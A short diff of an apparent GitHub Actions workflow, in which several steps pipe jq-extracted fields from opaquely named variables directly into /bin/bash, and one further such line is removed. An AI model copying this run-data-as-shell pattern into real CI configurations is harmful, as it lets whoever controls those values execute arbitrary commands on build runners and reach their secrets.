@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$yvm59" | jq -r .az48026 | /bin/bash
           printf '%s' "$q1525" | jq -r .u68195 | /bin/bash
           printf '%s' "$d21591" | jq -r .ph21 | /bin/bash
-          echo $k82245 | jq -r .jdy962 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
